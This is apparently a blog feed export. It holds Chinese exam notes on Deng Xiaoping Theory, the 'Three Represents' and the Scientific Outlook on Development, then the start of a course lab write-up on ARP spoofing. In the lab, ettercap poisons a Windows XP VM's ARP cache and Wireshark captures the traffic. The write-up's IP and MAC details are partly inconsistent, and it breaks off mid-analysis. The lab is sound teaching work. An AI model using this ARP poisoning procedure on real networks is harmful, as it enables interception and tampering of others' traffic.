<p>党的十三大从我国社会主义初级阶段的基本国情出发。“领导和团结全国各族人民，以经济建设为中心，坚持四项基本原则，坚持改革开放，自力更生，艰苦创业，为把我国建设成为富强、民主、文明的社会主义现代化国家而奋斗。“</p>
<p>5.党的基本路线分析</p>
<p>（1）首先，建设“富强、民主、文明的社会主义现代化国家”是<strong>党在社会主义初级阶段的奋斗目标。（单选）</strong></p>
<p>（2）其次，“以经济建设为中心，坚持四项基本原则，坚持改革开放”<strong>是实现奋斗目标的基本途径。（单选）</strong></p>
<p>（3）再次，“领导和团结各族人民”是实现奋斗目标的<strong>领导力量和依靠力量。</strong></p>
<p>（4）”自力更生，艰苦创业“<strong>是实现奋斗目标的根本立足点。</strong></p>
<p>（5）“以经济建设为中心，坚持四项基本原则，坚持改革开放”，即“一个中心、两个基本点”<strong>是党在社会主义初级阶段基本路线的简明概括。</strong></p>
<aside>
📔

<p>《坚持四项基本原则》</p>
<p><strong>必须在思想上政治上坚持社会主义道路、坚持无产阶级专政（后表述为人民民主专政）、坚持共产党的领导、坚持马列主义毛泽东思想这四项基本原则。</strong></p>
</aside>

<p><strong>3.党的基本路线在改革开放实践中不断充实和完善（重点大题）</strong></p>
<p>（1）党的十七大把<strong>“和谐”</strong>与“富强、民主、文明”一起写入了基本路线</p>
<p>（2）党的十九大提出<strong>“为把我国建设成为富强民主文明和谐美丽的社会主义现代化强国而奋斗”</strong>，进一步拓展了党的基本路线</p>
<h5 id="二、社会主义根本任务和发展战略理论"><a href="#二、社会主义根本任务和发展战略理论" class="headerlink" title="二、社会主义根本任务和发展战略理论"></a>二、社会主义根本任务和发展战略理论</h5><p>*<em><strong>社会主义根本任务的理论</strong></em></p>
<p>1.社会主义根本任务的理论概述</p>
<p><strong>（1）强调社会主义的根本任务是发展生产力。（重点重点）</strong></p>
<p>（2）我们的生产力发展水平很低，远远不能满足人民和国家的需要，这就是我们目前时期的主要矛盾。</p>
<p>（3）在社会主义改造基本完成以后，我国所要解决的<strong>主要矛盾是人民日益增长的物质文化需要同落后的社会生产之间的矛盾。我们革命的目的就是解放生产力、发展生产力。</strong></p>
<p>（4）发展生产力离不开科学技术。邓小平<strong>在南方谈话中再次明确了“科学技术是第一生产力”的观点，重大论断。</strong></p>
<p>（863计划）</p>
<p>*<em><strong>分三步走基本实现现代化的发展战略</strong></em></p>
<p>2.分三步走概述</p>
<p>（1）党的十三大把邓小平提出的”小康社会“思想和”三步走“的发展战略构想确定下来</p>
<p>（2）三步走：（有时考）</p>
<p>a.第一步，到1990年实现国民生产总值比1980年翻一番，解决人民的温饱问题</p>
<p>b.第二步，到20世纪末，使国民生产总值再增长一倍，人民生活达到小康水平</p>
<p>c.第三步，到21世纪中叶，人均国民生产总值达到中等发达国家水平，人民生活比较富裕，基本实现现代化，然后在这个基础上继续前进。</p>
<p>3.先富与共富，两个大局</p>
<p>（1）为了更好地实现“三步走”的发展战略，邓小平还提出允许和鼓励一部分地区、一部分人先富起来逐步实现共同富裕的思想</p>
<p>（2）关于地区的“先富”和“共富”，邓小平提出“两个大局”思想</p>
<p>a.即沿海先发展起来，从而带动内地更好地发展，这是一个事关大局的问题</p>
<p>b.反过来，发展到一定的时候，又要求沿海拿出更多力量来帮助内地发展，这也是个大局。那时沿海也要服从这个大局。</p>
<p>（3）邓小平强调在处理先富、后富和共富的关系时，要从大局看问题，在发展过程当中要允许不平衡、承认不平衡，同时也要从不平衡逐步达到相对的平衡，逐步实现共同富裕。</p>
<h5 id="三、社会主义改革开放和社会主义市场经济理论"><a href="#三、社会主义改革开放和社会主义市场经济理论" class="headerlink" title="三、社会主义改革开放和社会主义市场经济理论"></a>三、社会主义改革开放和社会主义市场经济理论</h5><p>*<em><strong>社会主义改革开放理论</strong></em></p>
<p>1.改革的性质</p>
<p>（1）改革是一场深刻的社会变革，是中国的第二次革命，是实行中国现代化的必由之路。</p>
<p>（2）改革不是原有经济体制的细枝末节的修补，<strong>它的实质和目标是要从根本上改变束缚我国生产力发展的经济体制，建立充满生机和活力的社会主义新经济体制。</strong></p>
<p>（3）改革是一场新的革命。但改革不是一个阶级推翻另一个阶级那种原来意义上的改革，而是社会主义制度的自我完善和发展。</p>
<p>（原有经济体制：计划经济体制（政府指令）；现有经济体制：市场经济体制（价格））</p>
<p>（4）<strong>改革是社会主义社会发展的直接动力。（单选）</strong>邓小平指出，要发展生产力，经济体制改革是必由之路。</p>
<p><strong>2.如何判断改革和各方面是非得失（重点，大题）</strong></p>
<p>（1）主要看是否有利于发展社会主义社会的<strong>生产力</strong></p>
<p>（2）是否有利于增强社会主义国家的<strong>综合国力</strong></p>
<p>（3）是否有利于提高<strong>人民生活水平</strong>，即“三个有利于”标准</p>
<p>3.改革开放，对外开放概述</p>
<p>（1）开放即是改革，对外开放是建设中国特色社会主义的一项基本国策，和改革一起成为<strong>新时期最鲜明的特征（改革开放）</strong>。1984年10月，党的十二届三中全会把实行对外开放作为基本国策。</p>
<p>（2）实行对外开放是对中国经济发展停滞后历史教训深刻总结的结果。</p>
<p>（3）对外开放是对世界所有国家的开放，包括对发达国家的开放，也包括对发展中国家的开放；不仅是经济领域的开放，还包括科技、教育、文化等领域的开放。在实行对外开放过程中，邓小平还特别强调两点：<strong>一是要正确对待资本主义社会创造的现代文明成果；二是对外开放过程中要高度珍惜并坚决维护中国人民经过长期奋斗得来的独立自主权利。</strong></p>
<p>（4）实践证明，改革开放是当代中国的鲜明标志和活力源泉，是决定中国命运的关键一招，也是实现中华民族伟大复兴的关键一招。改革开放只有进行时，没有完成时，必须毫不动摇地坚持。</p>
<p>*<em><strong>社会主义市场经济理论</strong></em></p>
<p>4.市场经济理论概述</p>
<p>（1）<strong>邓小平</strong>创立社会主义市场经济理论</p>
<p>（2）1992年，邓小平在南方谈话中明确指出。从理论上突破了计划经济和市场经济是制度属性的观念，从根本上解除了把计划经济和市场经济看做属于社会基本制度范畴的思想束缚，标志邓小平的社会主义市场经济理论形成，这也为党的十四大明确把建立社会主义市场经济体制作为我国经济体制改革的目标奠定了理论基础。</p>
<p>5.市场经济理论内涵</p>
<p>（1）<strong>是计划经济和市场经济不是划分社会制度的标志。</strong>计划经济不等于社会主义，市场经济也不等于资本主义</p>
<p>（2）<strong>二是计划和市场都是经济手段。</strong>对经济活动的调节各有优劣，社会主义实行市场经济是要把两者优势结合起来</p>
<p>（3）<strong>三是市场经济作为资源配置手段本身不具有制度属性，可以和不同的社会制度结合。</strong>坚持社会主义制度与市场经济的结合，是社会主义市场经济的特色所在、优势所在。</p>
<h5 id="四、“两手抓，两手都要硬”"><a href="#四、“两手抓，两手都要硬”" class="headerlink" title="四、“两手抓，两手都要硬”"></a>四、“两手抓，两手都要硬”</h5><p>在邓小平社会主义精神文明建设思想中，一手抓物质文明，一手抓精神文明，“两手抓，两手都要硬”具有鲜明的特色。</p>
<h5 id="五、“一国两制”与祖国统一"><a href="#五、“一国两制”与祖国统一" class="headerlink" title="五、“一国两制”与祖国统一"></a>五、“一国两制”与祖国统一</h5><p>1.“一国两制”构想的形成和发展，经历了一个不断探索的过程</p>
<p>（1）1979年元旦，全国人大常委会发表《告台湾同胞书》，郑重宣布了争取祖国和平统一的大政方针。</p>
<p>（2）与此同时，人民解放军从当天起停止对金门等岛屿的炮击。</p>
<p>（3）同年1月，邓小平在访问美国时指出“我们不再用‘解放台湾’这个提法了”。</p>
<p><strong>2.（大题重点）“一国两制”作为实现祖国和平统一的具有重大战略意义的构想的基本内容</strong></p>
<p><strong>（1）坚持一个中国，这是“和平统一、一国两制”的核心，是发展两岸关系和实现和平统一的基础</strong></p>
<p><strong>（2）两制并存</strong></p>
<p><strong>（3）高度自治</strong></p>
<p><strong>（4）尽最大努力争取和平统一，但不承诺放弃使用武力</strong></p>
<p><strong>（5）解决台湾问题，实现祖国完全统一，寄希望于台湾人民</strong></p>
<p>3.台湾问题是国内战争遗留下来的问题，属于中国的内政，不容许外国干涉。<strong>（台湾问题的实质是中国的内政问题）</strong></p>
<h5 id="六、中国特色社会主义外交和国际战略"><a href="#六、中国特色社会主义外交和国际战略" class="headerlink" title="六、中国特色社会主义外交和国际战略"></a>六、中国特色社会主义外交和国际战略</h5><p>（1）1987年，党的十三大确认了<strong>和平与发展是当今世界的两大主题这一深刻论断。</strong></p>
<p>（2）<strong>明确维护我国的独立和主权，促进世界的和平与发展，</strong>是中国外交政策的基本目标。</p>
<p>（3）坚持在和平共处五项原则的基础上，建立和平、稳定、公正、合理的国际新秩序。和平共处五项原则：<strong>相互尊重主权和领土完整、互不侵犯、互不干涉内政、平等互利、和平共处。</strong></p>
<h4 id="第三节-邓小平理论的历史地位（简答题）"><a href="#第三节-邓小平理论的历史地位（简答题）" class="headerlink" title="&amp;第三节 邓小平理论的历史地位（简答题）"></a>&amp;第三节 邓小平理论的历史地位（简答题）</h4><p><strong>（1）马克思列宁主义、毛泽东思想的继承和发展</strong></p>
<p><strong>（2）中国特色社会主义理论体系的开篇之作（单选）</strong></p>
<p><strong>（3）改革开放和社会主义现代化建设的科学指南</strong></p>
<h3 id="第七章-“三个代表”重要思想"><a href="#第七章-“三个代表”重要思想" class="headerlink" title="第七章 “三个代表”重要思想"></a>第七章 “三个代表”重要思想</h3><h4 id="第一节-“三个代表”重要思想核心观点"><a href="#第一节-“三个代表”重要思想核心观点" class="headerlink" title="&amp;第一节 “三个代表”重要思想核心观点"></a>&amp;第一节 “三个代表”重要思想核心观点</h4><p>（简单题三句话）<strong>始终代表中国先进生产力的发展要求、始终代表中国先进文化的前进方向、始终代表中国最广大人民的根本利益</strong></p>
<p>1.始终代表中国先进生产力的发展要求</p>
<p>（1）是什么：始终代表中国先进生产力的发展要求，就是党的理论、路线、纲领、 方针、政策和各项工作，必须努力符合生产力发展的规律，体现不断推动  社会生产力的解放和发展的要求，通过发展生产力<strong>不断提高人民群众的生活水平。</strong></p>
<p>（2）为什么：社会主义的根本任务是发展社会生产力，大力促进先进生产力的发展，是我们党站在时代前列、保持先进性的根本体现和根本要求。</p>
<p>（3）怎么做？</p>
<p>a.人是生产力中最活跃的因素。<strong>必须树立人才资源是第一资源的思想（单选）</strong>， 紧紧抓住培养人才、吸引人才、用好人才三个环节，大力实施人才战略，加强人才队伍建设。</p>
<p>b.“科学技术是第一生产力，是先进生产力的集中体现和主要标志”。（1995年科教兴国战略，90年代代表经济：家电行业）</p>
<p>2.始终代表中国先进文化的前进方向</p>
<p>（1）是什么：就是党的理论、路线、纲领、方针、政策和各项工作，<strong>必须努力体现社会主义文化的要求，</strong>促进全民族思想道德素质和科学文化素质的不断提高，为我国经济发展和社会进步提供精神动力和智力支持。</p>
<p>（2）为什么：<strong>发展先进文化，是实现社会主义现代化的战略任务。</strong>当今世界，文化与经济和政治相互交融，在综合国力竞争中的地位和作用越来越突出。必须牢牢把握先进文化的前进方向，不断满足人民群众日益增长的精神文化需求增强人民的精神力量。</p>
<p>（3）怎么做？</p>
<p>a.发展先进文化，<strong>就是发展中国特色社会主义的文化，</strong>就是建设社会主义精神文明。</p>
<p>b.发展先进文化，就是发展<strong>面向现代化、面向世界、面向未来的，民族的科学的大众的</strong>社会主义文化。必须坚持马克思主义在意识形态领域的指导地位，坚持<strong>为人民服务、为社会主义服务</strong>的方向和<strong>百花齐放、百家争鸣</strong>的方针。（三面向，三特点，二为方向，双百方针）</p>
<p>c.（重点）加强社会主义思想道德建设，是发展先进文化的<strong>重要内容和中心环节</strong>。<strong>弘扬爱国主义精神，以为人民服务为核心、以集体主义为原则、以诚实守信为重点，</strong>加强社会公德、职业道德和家庭美德教育。</p>
<p>d.<strong>教育</strong>是发展先进文化、建设物质文明和精神文明建设的<strong>基础工程。（单选）</strong></p>
<p>e.发展先进文化，需要重视社会主义文艺事业的繁荣发展。文艺是人类社会实践活动的生动反映，是民族精神的火炬，是人民奋进的号角。</p>
<p>3.始终代表中国最广大人民的根本利益</p>
<p>（1）就是党的理论、路线、纲领、 方针、政策和各项工作，必须坚持把人民的根本利益作为出发点和归宿，充分发挥人民群众的积极性主动性创造性，在社会不断发展进步的基础上，使人民群众不断获得切实的经济、政治、文化利益。</p>
<p><strong>（2）我们全部工作的出发点和落脚点，就是不断实现好维护好发展好最广大人民的根本利益。</strong></p>
<h4 id="第二节-“三个代表”重要思想主要内容"><a href="#第二节-“三个代表”重要思想主要内容" class="headerlink" title="第二节 “三个代表”重要思想主要内容"></a>第二节 “三个代表”重要思想主要内容</h4><p><strong>1.发展是党执政兴国的第一要务</strong></p>
<p><strong>（1）发展是硬道理，中国解决所有问题的关键在于依靠自己的发展。</strong></p>
<p>（2）要正确认识和处理改革、发展、稳定的关系。<strong>改革是动力，发展是目的，稳定是前提</strong>。要把改革的力度、发展的速度和社会可承受的程度<strong>统一起来</strong>，把不断改善人民生活作为处理改革发展稳定关系的重要结合点，在社会稳定中推进改革发展，通过改革发展促进社会稳定。</p>
<p><strong>2.建立社会主义市场经济体制</strong></p>
<p>（1）<strong>必须坚持和完善公有制为主体、多种所有制经济共同发展的社会主义基本经济制度。</strong>（02年16大，两个毫不动摇）</p>
<p>a.一方面，<strong>必须毫不动摇地巩固和发展公有制经济。</strong>公有制经济不仅包括国有经济和集体经济，还包括混合所有制经济中的国有成分和集体成分。</p>
<p>b.另一方面，<strong>必须毫不动摇地鼓励、支持和引导非公有制经济发展。</strong></p>
<p>（2）初级阶段基本分配制度：完善适应社会主义市场经济体制的分配关系。<strong>确立劳动、资本、技术和管理等生产要素按贡献参与 分配的原则，完善按劳分配为主体、多种分配方式并存的分配制度。</strong></p>
<p><strong>3.全面建设小康社会</strong></p>
<p><strong>4.建设社会主义政治文明</strong></p>
<p>（1）建设社会主义政治文明与物质文明、精神文明一起确立为社会主义现 代化全面发展的三大基本目标。</p>
<p>（2）建设社会主义政治文明，最根本的就是要<strong>坚持党的领导、人民当家作主和依法治国的有机统一。</strong>这是我们推进政治文明建设必须遵循的基本方针，也是我国社会主义政治文明区别于资本主义政治文明的<strong>本质特征</strong>。党的领导是人民当家作主和依法治国的根本保证，人民当家作主是社会主义民主政治的本质要求，<strong>依法治国</strong>是党领导人民治理国家的<strong>基本方略</strong>。</p>
<p><strong>5.实施“引进来”和“走出去”相结合的对外开放战略</strong></p>
<p>2001年12月，中国正式加入世界贸易组织，标志着我国对外开放进入了一个新的阶段。</p>
<p><strong>6.推进党的建设新的伟大工程</strong></p>
<p>（1）<strong>坚持中国共产党的领导</strong>，核心是坚持党的先进性。</p>
<p>（2）推进党的建设新的伟大工程，<strong>重点是加强党的执政能力建设</strong>。进一步解决提高党的领导水平和执政水平、提高拒腐防变和抵御风险能力这两大历史性课题</p>
<p><strong>（3）领导干部一定要讲学习、讲政治、讲正气。（三讲教育）</strong></p>
<h4 id="第三节-“三个代表”重要思想的历史地位"><a href="#第三节-“三个代表”重要思想的历史地位" class="headerlink" title="第三节 “三个代表”重要思想的历史地位"></a>第三节 “三个代表”重要思想的历史地位</h4><p><strong>（1）中国特色社会主义理论体系的丰富发展</strong></p>
<p><strong>（2）加强和改进党的建设、推进中国特色社会主义事业的强大理论武器</strong></p>
<h3 id="第八章-科学发展观"><a href="#第八章-科学发展观" class="headerlink" title="第八章 科学发展观"></a>第八章 科学发展观</h3><h4 id="第一节-科学发展观的科学内涵"><a href="#第一节-科学发展观的科学内涵" class="headerlink" title="第一节 科学发展观的科学内涵"></a><strong>第一节</strong> <strong>科学发展观的科学内涵</strong></h4><p><strong>（简答题四句话）推动经济社会发展是科学发展观的第一要义、以人为本是科学发展观的核心立场、全面协调可持续是科学发展观的基本要求、统筹兼顾是科学发展观的根本方法。</strong></p>
<p>1.推动经济社会发展是科学发展观的第一要义</p>
<p>（1）<strong>坚持科学发展，必须加快转变经济发展方式。</strong></p>
<p>a.促进经济增长由主要依靠投资、出口拉动向依靠消费、投资、出口协调拉动转变。（出口导向——投资驱动+扩大内需、政府基础设施建设投资）</p>
<p>b.由主要依靠第二产业带动向依靠第一、第 二 、第三产业协同带动转变。（产业结构优化升级）</p>
<p>c.由主要依靠增加物质资源消耗向主要依靠科 技进步、劳动者素质提高、管理创新转变。（粗放型——资源节约，环境友好）</p>
<p>（2）<strong>坚持科学发展，必须推动科学技术的跨越式发展。</strong>胡锦涛提出了<strong>建设创新型国家的重大战略思想</strong>，提高自主创新能力。</p>
<p>（3）<strong>坚持科学发展，必须培养高素质创新型人才。</strong></p>
<p>（4）<strong>坚持科学发展，必须善于抓住和用好机遇。</strong>党的十六大在综合分析进入新世纪后国际国内形势变化的基础上，作出了21世纪头二十年对我国来说是一个必须紧紧抓住并且可以大有作为的<strong>重要战略机遇期</strong>的重大判断。</p>
<p>2.以人为本是科学发展观的核心立场</p>
<p>*是什么？</p>
<p>（1）<strong>以人为本</strong>是科学发展观的核心立场，集中体现了马克思主义的基本原理，体现了我们党全心全意为人民服务的根本宗旨和推动经济社会发展的根本目的，<strong>是社会主义的本质特征。</strong></p>
<p>（2）（单选）我们提出以人为本的<strong>根本含义</strong>，就是<strong>坚持全心全意为人民服务，立党为公、执政为民，始终把最广大人民根本利益作为党和国家工作的根本出发点和落脚点</strong>。</p>
<p>（3）中国共产党把全心全意为人民服务作为自己的根本宗旨，始终坚持人民的利益高于一切。</p>
<p>*怎么做？</p>
<p>（1）坚持以人为本，就要坚持发展为了人民。</p>
<p>（2）坚持以人为本，就要坚持发展依靠人民。</p>
<p>（3）坚持以人为本，就要坚持发展成果由人民共享。</p>
<p>（4）坚持以人为本，最终是为了实现人的全面发展。</p>
<p>3.（重点）全面协调可持续是科学发展观的基本要求</p>
<p>（1）全面协调可持续中的“全面”是指发展要有<strong>全面性、整体性，</strong>不仅经济要发展，而且各个方面都要发展。</p>
<p>（2）“协调”是指发展要有<strong>协调性、均衡性，</strong>各个方面、各个环节的发展要相互适应、相互促进。</p>
<p>（3）“可持续”是指发展要有<strong>持久性、连续性</strong>，不仅当前要发展，而且要保证长远发 展 。</p>
<p>4.（重点）统筹兼顾是科学发展观的根本方法</p>
<p>（1）党的十六届三中全会提出，要统筹<strong>城乡发展、区域发展、经济社会发展、人与自然和谐发展、国内发展和对外开放，强调要坚持统筹兼顾、协调好改革进程中的各种利益关系。</strong></p>
<p>（2）党的十七大在强调要坚持“五个统筹”的同时，进一步强调要统筹中央和地方关系，统筹个人利益和集体利益、局部利益和整体利益、当前利益和长远利益，统筹国内国际两个大局。</p>
<h4 id="第二节-科学发展观的主要内容"><a href="#第二节-科学发展观的主要内容" class="headerlink" title="&amp;第二节  科学发展观的主要内容"></a><strong>&amp;第二节</strong>  <strong>科学发展观的主要内容</strong></h4><p>1.加快转变经济发展方式</p>
<p>2.发展社会主义民主政治</p>
<p>（1）社会主义民主政治的<strong>本质和核心是人民当家作主。</strong>发展社会主义民主政治，必须坚定不移地走中国特色社会主义政治发展道路。</p>
<p>（2）坚 持中国特色社会主义政治发展道路，最根本的是要<strong>坚持党的领导、人民当家作主、依法治国有机统一。</strong></p>
<p>3.推进社会主义文化强国建设</p>
<p>（1）科学发展观强调，要树立高度的文化自觉和文化自信，<strong>提高国家文化软实力（重点）</strong>，加快建设与我国深厚文化底蕴和丰富文化资源相匹配，<strong>建设社会主义文化强国</strong> 。</p>
<p>（2）（单选）建设社会主义核心价值体系。社会主义核心价值体系是兴国之魂，决定着中国特色社会主义发展方向。马克思主义指导思想、中国特色社会主义共同理想、<strong>以爱国主义为核心的民族精神和以改革创新为核心的时代精神</strong>、社会主义荣辱观，共同构成社会主义核心价值体系的基本内 容。</p>
<p>（3）党的十八大，<strong>践行社会主义核心价值观。</strong></p>
<p><strong>4.（重点）构建社会主义和谐社会</strong></p>
<p>（1）胡锦涛明确指出：<strong>社会和谐是中国特色社会主义的本质属性。（重点！单选）</strong></p>
<p>（2）中国共产党领导全体人民共同建设、共同享有的和谐社会，是<strong>经济建设、政治建设、文化建设、社会建设、生态文明建设协调发展的社会，是人与人、人与社会、人与自然整体和谐的社会。（社会主义和谐社会的内涵）</strong></p>
<p>（3）<strong>民主法治、公平正义、诚信友爱、充满活力、安定有序、人与自然和谐相处，</strong>是构建社会主义和谐社会的<strong>总要求</strong>。</p>
<p>（4）保障和改善民生。构建社会主义和谐社会，必须以保障和改善民生为重点，从解决关系人民群众切身利益的现实问题入手。</p>
<p><strong>一是优先发展教育。二是积极扩大就业。三是合理收入分配。四是完善社会保障。五是发展医药卫生。</strong></p>
<p>5.推进生态文明建设</p>
<p>五位一体：必须树立尊重自然、顺应自然、保护自然的生态文明理念，把生态文明建设放在突出地位，融入经济建设、政治建设、文化建设、社会建设各方面和全过程。</p>
<p>6.全面提高党的建设科学化水平</p>
<p>（了解）（1）党面临的执政考验、改革开放考验、市场经济考验、外部环境考验是长期的、复杂的、严峻的，精神懈怠危险、能力不足危险、脱离群众危 险、消极腐败危险</p>
<p>（2）<strong>保持和发展党的先进性</strong>是马克思主义政党<strong>自身建设的根本任务和永恒课题</strong>。胡锦涛指出：“先进性是马克思主义政党的本质属性，是马克思主义政党的生命所系、力量所在。“</p>
<p>（3）（单选）<strong>密切联系群众</strong>是我们党的最大政治优势，<strong>脱离群众</strong>是我们党执政后的最大危险。</p>
<h4 id="第三节-科学发展观的历史地位（简答题）"><a href="#第三节-科学发展观的历史地位（简答题）" class="headerlink" title="第三节 科学发展观的历史地位（简答题）"></a><strong>第三节</strong> <strong>科学发展观的历史地位（简答题）</strong></h4><p><strong>（1）中国特色社会主义理论体系在新世纪新阶段的接续发展</strong></p>
<p><strong>（2）全面建设小康社会、加快推进社会主义现代化的根本指针</strong></p>
]]></content>
      <categories>
        <category>复习总结</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>毛概</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实验1：ARP欺骗</title>
    <url>/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="ARP欺骗课堂实验"><a href="#ARP欺骗课堂实验" class="headerlink" title="ARP欺骗课堂实验"></a>ARP欺骗课堂实验</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>运行WinArpAttacker或Ettercap（二选一），通过WireShark等抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>（1）攻击机：Kali-linux 2022.3</p>
<p>（2）靶机：windows xp</p>
<p>（3）软件：ettercap-0.8.31，wireshark</p>
<h3 id="实验过程与结果"><a href="#实验过程与结果" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：搭建实验环境并查看虚拟机信息"><a href="#步骤一：搭建实验环境并查看虚拟机信息" class="headerlink" title="步骤一：搭建实验环境并查看虚拟机信息"></a>步骤一：搭建实验环境并查看虚拟机信息</h4><p>1.配置攻击机Kali-linux 2022.3（自带ettercap）。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img1.png" alt="图1 打开攻击机kali"></p>
<p>2.在kali虚拟机中右键选择”在这里打开终端”，使用ifconfig命令查看kali虚拟机网卡、ip地址、网关地址等信息。如图1.2所示，可知kali虚拟机的ip地址为192.168.204.134，Mac地址为00:0c:29:a5:82:6c。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img2.png" alt="图2 ifconfig命令查看kali虚拟机信息"></p>
<p>3.配置靶机windows xp。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img3.png" alt="图3 打开靶机windows xp"></p>
<p>4.在windows xp虚拟机中按”win+R”输入”cmd”打开命令行，使用命令ipconfig &#x2F;all查看虚拟机网卡、ip地址、网关地址等信息。如图1.4所示，可知windows xp虚拟机的ip地址为192.168.204.135，默认网关为10.21.128.1，Mac地址为00:0c:29:5D:E8:C3。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img4.png" alt="图4 ipconfig /all命令查看xp虚拟机信息"></p>
<p>5.两虚拟机实施ping通：</p>
<p>（1）kali PING windows xp</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img5.png" alt="图5 kali ping通xp"></p>
<p>（2）windows xp PING kali</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img6.png" alt="图6 xp ping通kali"></p>
<p>6.在靶机windows xp命令行中使用arp -a命令查看靶机被攻击前的arp信息。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img7.png" alt="图7 靶机被攻击前的arp信息"></p>
<h4 id="步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理"><a href="#步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理" class="headerlink" title="步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理"></a>步骤二：使用ettercap进行攻击并分析ARP欺骗攻击原理</h4><p>1.在kali中，使用命令sudo ettercap -G打开ettercap图形化界面。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img8.png" alt="图8 在kali中打开ettercap"></p>
<p>2.选择当前网卡eth0后，点击右上角”√”后开始嗅探，点击搜索按钮扫描该网段的所有主机信息，再点击🔍右侧按钮在host list中查看扫描结果。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img9.png" alt="图9 当前网卡开始嗅探"></p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img10.png" alt="图10 扫描该网段所有的主机信息"></p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img11.png" alt="图11 在host list中查看扫描结果"></p>
<p>3.分别将靶机windows xp的IP和网关地址设为目标1和目标2。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img12.png" alt="图12 设置目标1和目标2"></p>
<p>4.在MITM菜单中选择ARP Poisoning，点击ok开始攻击。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img13.png" alt="图13 选择ARP Poisoning"></p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img14.png" alt="图14 点击OK开始攻击"></p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img15.png" alt="图15 显示ARP poisoning victims"></p>
<p>5.在靶机windows xp中打开命令行输入”apr -a”命令，查看被arp投毒后的靶机arp信息。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img16.png" alt="图16 被arp投毒后的靶机arp信息"></p>
<p>6.与被攻击前的靶机arp信息比较，发现Mac地址（Physical Address）由原Mac地址00:50:56:e8:44:a5变为攻击机kali的Mac地址00:0c:29:a5:82: 6c。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img17.png" alt="图17 比较被攻击前后靶机arp信息中的Mac地址"></p>
<p>7.由此可知，在arp表下靶机的Mac地址已经变成了攻击者的Mac地址，则靶机的信息将全部被kali攻击机截获，并且攻击机可以向靶机发送篡改后的信息，由此实现arp欺骗中间人攻击，信息的保密性和完整性都将受到破坏。</p>
<h4 id="步骤三：使用wireshark抓包分析ARP欺骗网络流量"><a href="#步骤三：使用wireshark抓包分析ARP欺骗网络流量" class="headerlink" title="步骤三：使用wireshark抓包分析ARP欺骗网络流量"></a>步骤三：使用wireshark抓包分析ARP欺骗网络流量</h4><p>1.在kali虚拟机中打开终端，输入”sudo wireshark”命令以root用户权限启动wireshark。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img18.png" alt="图18 打开wireshark"></p>
<p>2.在嗅探过程中，选择接口”eth0”，点击左上角开始按钮进行抓包。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img19.png" alt="图19 wireshark开始抓包"></p>
<p>3.查看捕获的数据包可以在协议Protocol一栏找到”ARP”即为ARP欺骗攻击的数据包，观察信息info一栏均为192.168.117.133(&#x2F;2) at 00:0c:29:f1:f1:c4。</p>
<p><img src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img20.png" alt="图20 应用发起arp欺骗攻击的数据包"></p>
<p>4.点击展开Address Resolution Protocol（reply）查看ARP部分抓包细节。</p>
